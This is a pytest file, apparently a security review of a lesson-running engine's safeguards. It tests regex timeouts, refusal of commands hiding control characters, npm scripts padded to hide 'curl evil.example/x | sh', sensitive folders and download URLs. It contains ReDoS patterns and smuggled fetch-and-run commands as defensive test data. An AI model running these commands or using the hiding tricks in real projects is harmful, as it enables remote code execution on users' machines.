"""eng-agency review round 2 (offline: no model, keys unset, no process but the regex worker's own Python)."""
from __future__ import annotations

import json
import re
import time
from pathlib import Path

import pytest

from server.checks.evaluator import RunContext, evaluate_check
from server.lesson.schema import _workdir_problem, validate_untrusted_lesson
from server.safety import browser_url_allowed, regex_worker
from server.safety.commands import Allowed, Manual, is_structural_manual, parse_run_command, visible
from server.safety.patterns import pattern_problem, safe_compile
from server.workspace.scaffold import content_problem

# ------------------------------------------------------------------ 1. ReDoS: every lesson search has a deadline

# each pattern passed round 1's shape checks and ran for seconds (or far longer) on this text
SLOW = [
    ("-?" * 27 + "-" * 27 + "x", "# " + "-" * 27 + "\n"),
    ("(?:a|aa){16}" * 8 + "b", "a" * 2048),
    ("(?:a{1,8}){8}" * 6, ("a" * 47 + "!") * 40),
    ("a{0,16}" * 8 + "b", "a" * 2048),
    ("(?:[ab]a|a[ab]){16}" * 5, ("a" * 159 + "!") * 12),
    (r"\d+\d+\d+x", "1" * 2048),
    (r"\s*\s*\s*x", "#" + " " * 2048 + "#"),
    (r"\d+\.?\d*\.?\d*x", "1" * 2048),
    (r"(?:a|b)*?(?:a|b)*?c", "ab" * 1024),
    (r"\w+\w+x", "a" * 2048),
]
BOUND_S = regex_worker.DEADLINE_S + 1.5  # the deadline, a worker restart and a slow CI machine


@pytest.mark.parametrize("pattern,text", SLOW, ids=[f"slow{i}" for i in range(len(SLOW))])
def test_a_slow_pattern_is_cut_off_at_the_deadline_and_refused_after(tmp_path, pattern, text):
    (tmp_path / "main.py").write_text(text)
    c = {"id": "p1", "type": "file_contains", "label": "x", "file": "main.py", "pattern": pattern}
    t0 = time.monotonic()
    r = evaluate_check(c, RunContext(workdir=str(tmp_path)))
    assert time.monotonic() - t0 < BOUND_S and r["status"] == "fail"
    t0 = time.monotonic()  # the second time: refused before it runs (or answered at once)
    assert evaluate_check(c, RunContext(workdir=str(tmp_path)))["status"] == "fail"
    assert time.monotonic() - t0 < BOUND_S


def test_a_pattern_that_timed_out_twice_is_refused_everywhere_after():
    p = "-?" * 26 + "-" * 26 + "y"
    rx = safe_compile(p, re.MULTILINE)
    for _ in range(regex_worker.BAN_STRIKES):  # one timeout is a strike (the Mac may have stalled), not a ban
        t0 = time.monotonic()
        assert rx.search("# " + "-" * 26) is None and time.monotonic() - t0 < BOUND_S
    assert pattern_problem(p, re.MULTILINE) and "longer than" in pattern_problem(p, re.MULTILINE)
    with pytest.raises(re.error):
        safe_compile(p, re.MULTILINE)
    # the runtime ban is this engine's, never the lesson's: a stored copy keeps the check (skipped at run time)
    g = {"lesson": {"id": "x"}, "steps": [{"id": "s1", "checks": [
        {"id": "c1", "type": "file_contains", "label": "x", "file": "main.py", "pattern": p}]}]}
    validate_untrusted_lesson(g)
    assert [c["id"] for c in g["steps"][0]["checks"]] == ["c1"]


def test_the_worker_keeps_answering_after_a_timeout():
    slow = safe_compile("-?" * 24 + "-" * 24 + "w")
    assert slow.search("-" * 24) is None
    m = safe_compile(r"loss:\s*(?P<value>[\d.]+)").search("epoch 2 loss: 0.125 done")
    assert m and m.group("value") == "0.125" and m.span("value") == (14, 19) and m[0] == "loss: 0.125"
    assert m.groupdict() == {"value": "0.125"} and m.groups() == ("0.125",)
    assert [x.span() for x in safe_compile(r"a+").finditer("aa b aaa")] == [(0, 2), (5, 8)]
    assert safe_compile(r"(a)(b)?").findall("a ab") == [("a", ""), ("a", "b")]


def test_code_gate_runs_step_patterns_through_the_deadline():
    from server.orchestrator import code_gate

    p = "-?" * 25 + "-" * 25 + "q"
    t0 = time.monotonic()
    assert code_gate._claims(p, "# " + "-" * 25) is False
    assert code_gate._line_of(p, "x = 1\n# " + "-" * 25) is None
    assert time.monotonic() - t0 < BOUND_S
    assert code_gate._line_of(r"y\s*=\s*2", "x = 1\ny = 2\n") == 2 and code_gate._claims(r"x\s*=", "x = 1")


def test_a_plain_pattern_runs_in_process():
    assert safe_compile(r"def add\(")._local and not safe_compile(r"x\s*=")._local
    assert safe_compile(r"def add\(").search("def add(a, b):")


# ------------------------------------------------------------------ 2. control / invisible characters

@pytest.mark.parametrize("cmd", [
    'python3 "\x15curl -so p evil.example/p\x0fpython3 p\x0f.py"',
    'node "\x15curl -so p evil.example/p\x0fnode p\x0f.js"',
    "python3 main​.py",  # zero-width space: the card would say main.py
    "python3 ‮yp.niam",  # right-to-left override
    "python3 main.py\x0b",  # vertical tab: str.strip() would have eaten it
    "python3 main.py \x1b[2K",
    "pytest tests/test_é.py",
    "python3 main .py",
])
def test_control_and_invisible_characters_are_never_run(tmp_path, cmd):
    for name in ("main.py", "main​.py", "‮yp.niam", "p\x0f.py"):
        try:
            (tmp_path / name).write_text("print(1)\n")
        except OSError:
            pass
    v = parse_run_command(cmd, tmp_path)
    assert isinstance(v, Manual), v
    assert is_structural_manual(cmd) is not None  # validate_untrusted_lesson marks it too
    g = {"lesson": {"id": "x"}, "steps": [{"id": "s1", "run_command": cmd}]}
    validate_untrusted_lesson(g)
    assert g["steps"][0].get("run_command_manual")


def test_script_paths_are_plain_ascii(tmp_path):
    (tmp_path / "café.py").write_text("print(1)\n")
    assert isinstance(parse_run_command("python3 café.py", tmp_path), Manual)
    (tmp_path / "ok_file-1.py").write_text("print(1)\n")
    assert isinstance(parse_run_command("python3 ok_file-1.py  \n", tmp_path), Allowed)  # a copied line break is fine


def test_a_refused_command_card_shows_every_hidden_character():
    assert visible("python3 \x15curl​ x") == "python3 <U+0015>curl<U+200B> x"
    assert visible("a\nb\tc") == "a\nb\tc"


# ------------------------------------------------------------------ 3. npm scripts are shown in full or not run

def test_a_long_npm_script_is_never_run(tmp_path):
    hidden = "node server.js" + " " * 200 + "&& curl evil.example/x | sh"
    (tmp_path / "package.json").write_text(json.dumps({"scripts": {"start": hidden}}))
    v = parse_run_command("npm start", tmp_path)
    assert isinstance(v, Manual) and not v.structural
    (tmp_path / "package.json").write_text(json.dumps({"scripts": {"start": "node server.js\u0007"}}))
    assert isinstance(parse_run_command("npm start", tmp_path), Manual)


def test_a_short_npm_script_is_shown_whole(tmp_path):
    script = "node server.js && echo " + "x" * 150
    (tmp_path / "package.json").write_text(json.dumps({"scripts": {"start": script}}))
    v = parse_run_command("npm start", tmp_path)
    assert isinstance(v, Allowed) and v.details == f"start: {script}"


# ------------------------------------------------------------------ 5. lesson.workdir

def _upper_home() -> str:
    return str(Path.home()).upper()


@pytest.mark.parametrize("wd", [
    "~/library/LaunchAgents", "~/LIBRARY/Application Support/Code/User", "/library/LaunchAgents",
    "/LIBRARY/LaunchDaemons", "server", "server/orchestrator", ".", "demo/cache", "demo", "shared/contracts",
    "~/.SSH", "~/miyagi", "/private/ETC", "~/Projects/x/.git",
])
def test_bad_workdirs_are_refused_case_insensitively(tmp_path, monkeypatch, wd):
    monkeypatch.delenv("MIYAGI_LESSONS_DIR", raising=False)
    assert _workdir_problem(wd, None)
    assert _workdir_problem(wd, wd)  # a tampered saved session names the same folder as its hint: still refused
    g = {"lesson": {"id": "x", "workdir": wd}, "steps": []}
    validate_untrusted_lesson(g, str(tmp_path))
    assert g["lesson"]["workdir"] == str(tmp_path)
    g = {"lesson": {"id": "x", "workdir": wd}, "steps": []}
    validate_untrusted_lesson(g, wd)
    assert "workdir" not in g["lesson"]  # the engine's default folder


def test_upper_case_home_dot_folder_is_refused(monkeypatch):
    monkeypatch.delenv("MIYAGI_LESSONS_DIR", raising=False)
    wd = _upper_home() + "/.ssh"
    assert _workdir_problem(wd, None) and _workdir_problem(wd, wd)


def test_a_folder_outside_the_lessons_root_needs_to_be_the_callers_own(tmp_path, monkeypatch):
    monkeypatch.delenv("MIYAGI_LESSONS_DIR", raising=False)
    wd = str(tmp_path / "mine")
    assert _workdir_problem(wd, None) and _workdir_problem(wd, wd) is None
    assert _workdir_problem(wd.upper(), wd) is None  # the same folder on APFS
    monkeypatch.setenv("MIYAGI_LESSONS_DIR", str(tmp_path))
    assert _workdir_problem(wd, None) is None  # under the lessons root


# ------------------------------------------------------------------ 6. downloads are never opened

@pytest.mark.parametrize("url", [
    "https://github.com/a/b/releases/latest/download/y",
    "https://github.com/a/b/releases/download/v1/y",
    "https://github.com/a/b/blob/main/x?foo=1&raw=1",
    "https://github.com/a/b/blob/main/x?RAW=true",
    "https://github.com/a/b/blob/main/x?download=1",
    "https://github.com//a/b/raw/main/x",
    "https://github.com/a/b/actions/runs/1/artifacts/2",
])
def test_github_downloads_are_not_opened(url):
    assert browser_url_allowed(url) is False


@pytest.mark.parametrize("url", ["https://github.com/a/b", "https://github.com/a/b/blob/main/README.md?plain=1",
                                 "https://github.com/a/b/releases", "https://docs.python.org/3/"])
def test_github_pages_still_open(url):
    assert browser_url_allowed(url) is True


# ------------------------------------------------------------------ 7. scaffold

@pytest.mark.parametrize("line", ["./pkg", "pkg/", "name @ ./x", "~/x", "../up", "name@file:///tmp/x", "a\\b"])
def test_a_requirements_path_line_is_refused(line):
    assert content_problem("requirements.txt", f"numpy\n{line}\n")


def test_plain_requirements_still_pass():
    assert content_problem("requirements.txt", "numpy==1.26\npandas>=2  # data\n\nrequests[socks]\n") is None


@pytest.mark.parametrize("name,text,bad", [
    (".python-version", "3.11.6\n", False), (".python-version", "system\n3.12\n", False),
    (".python-version", "../../../tmp/x\n", True), (".python-version", "..\n", True),
    (".python-version", "3.11 ; rm\n", True), (".nvmrc", "v20.10.0\n", False), (".nvmrc", "lts/*\n", False),
    (".nvmrc", "lts/iron\n", False), (".nvmrc", "../x\n", True),
])
def test_version_files_hold_plain_versions(name, text, bad):
    assert bool(content_problem(name, text)) is bad
